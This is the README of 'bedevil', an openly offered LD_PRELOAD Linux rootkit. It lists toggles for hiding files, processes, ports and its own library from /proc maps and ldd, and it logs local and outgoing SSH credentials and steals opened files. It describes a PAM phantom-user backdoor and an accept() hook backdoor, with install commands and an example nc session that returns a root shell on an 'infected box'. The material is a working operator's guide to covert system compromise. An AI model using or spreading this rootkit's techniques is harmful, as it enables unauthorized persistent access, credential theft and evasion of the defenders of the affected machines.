# bedevil

###### Based on my other rootkit, [vlany](https://github.com/mempodippy/vlany)
<i>bedevil is designed to be more robust, faster and efficient than vlany.</i>

## Aim of bedevil
Ultimately my core aim is to tidy up the project, fix outstanding issues and organise previous chaos into a more manageable system. This hopefully makes it heaps easier on (not just) me when it comes to managing the rootkit's different functionalities. I've also made an effort to optionally minimalise the amount of dependencies required to install the kit on a machine.

</hr>

## Important files
*(inc/)*
 * [__toggles.h__](https://github.com/naworkcaj/bdvl/blob/master/inc/toggles.h): rootkit functionality toggles. read for more info
 * [__stdincludes.h__](https://github.com/naworkcaj/bdvl/blob/master/inc/stdincludes.h): just standard headers
 * [__includes.h__](https://github.com/naworkcaj/bdvl/blob/master/inc/includes.h): read for info
 * [__bedevil.c__](https://github.com/naworkcaj/bdvl/blob/master/inc/bedevil.c): centre for all bedevil

*(inc/\*)* (header include directories may have their own exclusive files)
 * __char_arrays__: list of char arrays to write, with their respective array elements
 * __consts__: background consts that the user doesn't really need to see

 *(examples)*
 * [__inc/hooks/libdl/char_arrays__](https://github.com/naworkcaj/bdvl/blob/master/inc/hooks/libdl/char_arrays)
 * [__inc/hooks/open/consts__](https://github.com/naworkcaj/bdvl/blob/master/inc/hooks/open/consts)

</hr>

## bedevil.sh
```
$ ./bedevil.sh -h

   /$$                     /$$                   /$$/$$
  | $$                    | $$                  |__| $$
  | $$$$$$$  /$$$$$$  /$$$$$$$ /$$$$$$ /$$    /$$/$| $$
  | $$__  $$/$$__  $$/$$__  $$/$$__  $|  $$  /$$| $| $$
  | $$  \ $| $$$$$$$| $$  | $| $$$$$$$$\  $$/$$/| $| $$
  | $$  | $| $$_____| $$  | $| $$_____/ \  $$$/ | $| $$
  | $$$$$$$|  $$$$$$|  $$$$$$|  $$$$$$$  \  $/  | $| $$
  |_______/ \_______/\_______/\_______/   \_/   |__|__/
                                                     
               LD_PRELOAD Linux rootkit

  Usage: $0 [option(s)]
      Options:
          -h: Show this help message & exit.
          -e: Do an environment check.
          -u: Enable use of 'dialog' throughout setup.
          -t: Go through & switch rootkit toggles.
          -C: Clean up installation/compilation mess.
          -d: Configure rootkit headers & settings.
          -c: Compile rootkit library in current directory & exit.
          -D: Install all potential required dependencies. (REQUIRES ROOT)
          -i: Launch full installation of bedevil. (REQUIRES ROOT)

```
 * *Compile only (no installation):* `./bedevil.sh -dc` (will quickly compile the .so in the your cwd)  
 * *Changing variable values (example):* `BD_UNAME=my_uname BD_PWD=my_pwd ./bedevil.sh -dc`  
 * *Full installation:* `./bedevil.sh -ti` (will ask what you want to enable/disable then launch installation)

</hr>

## Rootkit toggles
 * [`inc/toggles.h`](https://github.com/naworkcaj/bdvl/blob/master/inc/toggles.h) is just exactly as it sounds. By (un)defining different toggle definitions, you have more control what bedevil can & will do upon installation. Comments available.  
 * [`etc/toggles.sh`](https://github.com/naworkcaj/bdvl/blob/master/etc/toggles.sh) is used by bedevil.sh to read, parse, and make changes to toggles.h without manual editing.

| Toggle           | Info                                                         | Default status | Dependency | Ignored(?) |
| :-------------   | :----------------------------------------------------------- | :------------- | :--------- | :--------- |
| `USE_ACCEPT_BD`  | allows backdoor connection via running (& infected) services | off            | -          | no         |
| `USE_PAM_BD`     | allows interactive login as a backdoor user via ssh          | off            | libpam     | no         |
| `LOG_LOCAL_AUTH` | log local successful user authentications                    | off            | libpam     | no         |
| `HIDE_SELF`      | hides files and processes based on rootkit magic GID         | on             | -          | yes        |
| `HIDE_HOOKS`     | hides malicious function hooking from dlsym                  | on             | -          | yes        |
| `FORGE_MAPS`     | hides rootkit presence from process map files                | on             | -          | yes        |
| `HIDE_PORTS`     | hides ports & port ranges defined in 'hide_ports' file       | on             | -          | yes        |
| `DO_REINSTALL`   | maintains the rootkit's preload file                         | on             | -          | yes        |
| `DO_EVASIONS`    | hides rootkit presence from unsavoury processes              | on             | -          | yes        |
| `BLOCK_STRINGS`  | prevents users from calling strings on certain files         | on             | -          | yes        |
| `LOG_SSH`        | logs outgoing ssh logins to install dir                      | off            | -          | no         |
| `FILE_STEAL`     | attempts to steal FoI when opened by open/fopen              | off            | -          | no         |
| `LINK_IF_ERR`    | link said FoI if we can't copy it                            | off            | -          | yes        |
| `USE_CRYPT`      | to use or not to use libcrypt                                | on             | libcrypt   | yes        |
| `ACCEPT_USE_SSL` | to use SSL or not for the accept hook backdoor               | off            | libssl     | no         |
| `EXEC_PRE_SHELL` | execute command to welcome us into accept backdoor           | on             | -          | yes        |

</hr>

## Feature information

### Network port hiding
With bedevil installed, you can manually hide or unhide any specific ports or port ranges on the box by editing the `hide_ports` file in the rootkit's installation directory. (or 'inc/hide_ports' before installing...)  
i.e.:
```
$ cat hide_ports
4291
304-306
1000-1003
```
###### *Where a hyphen represents a range.*

Automatically, `bedevil.sh` will write which ports or port ranges are being hidden to the `hide_ports` file.

### Library presence hiding
bedevil hides itself from any process map files. Reading `/proc/$$/maps`, `/proc/$$/smaps`, or `/proc/$$/numa_maps` when the kit is installed will make it seem apparent that there are no other potentially malicious libraries being loaded into userspace.
  
Calling `ldd` on any dynamic binaries will not immediately reveal the location of the rootkit's shared library. Calling `ldd` as a regular user will throw a IO error, and calling `ldd` as root user will grant us sufficient permissions to quickly uninstall and reinstall the rootkit after showing a 'clean' ldd output to the root user. Further fogging the location of the rootkit's library.

### User credential logging
bedevil logs successful authentication attempts on the box it is installed on, but <b>also</b> will now log all outgoing ssh credentials. Both of these are logged in your installation directory in their respective files.

</hr>

## Backdoor
Within bedevil, you can choose to use the PAM backdoor and/or the accept hook backdoor. There are pros and cons to using either method. In order to choose which backdoor method you would like to use, see the 'toggles' section at the beginning of this README. There is a README inside the rootkit's installation directory that you may wish to consult from a backdoor shell. *([this](https://github.com/naworkcaj/bdvl/blob/master/etc/README))*  

### PAM
 * By hijacking libpam's authentication functions, we create a phantom user on the machine that can be logged into just the same as any other user.
 * During installation you'll give a username and password which you'll be able to use to log into your backdoor, over ssh.
 * See [ssh.sh](https://gist.github.com/naworkcaj/290162d025925d88e4820a7c0056418a) on connecting with your hidden port.

*[wtmp/utmp hooks](https://github.com/naworkcaj/bdvl/tree/master/inc/utmp)  
By hooking the responsible utmp & wtmp functions, information that may give off indication of a PAM backdoor is throttled.  
see utmp/[putut.c](https://github.com/naworkcaj/bdvl/blob/master/inc/utmp/putut.c)*

| Pros                        | Cons                           |
| :-------------------------- | :----------------------------- |
| secure connection over ssh  | wtmp and utmp logs need hidden |
| interactive shell           | PAM logins can be disabled     |

### accept() hook
 * By intercepting and hijacking libc's accept(), we can connect to existing services (assuming they have been restarted upon installation) on ports on a box and have them drop us a reverse shell if conditions are met.
 * When using `ACCEPT_PORT` as your local source port when connecting to said box, bedevil will drop you the shell when you correctly enter your backdoor password. (`BD_PWD`)
 * `ACCEPT_PORT` is automatically a hidden port in `'hide_ports'`.

#### SSL
 * If you are using the accept hook backdoor w/ SSL enabled, the SSL backdoor source port is `$ACCEPT_PORT + 1`.  
 * The plaintext backdoor source port is still available to use even when you have enabled `ACCEPT_USE_SSL`.*

#### Example connection to infected box
*where the host is `213.82.46.164` `ACCEPT_PORT` is 839 & `BD_PWD` is `'my_password'`*
```
$ nc 213.82.46.164 22 -p 839
my_password
...
uid=0(root) gid=666 groups=666
...
```

| Pros                                         | Cons                                    |
| :------------------------------------------- | :-------------------------------------- |
| not as much need to worry about logs         | plaintext unless using SSL              |
| fast                                         | not an interactive shell. but can be    |
| doesn't require miscellaneous backdoor files | requires running & infected services    |

<!-- `while true; do ldd /bin/echo; done` :< -->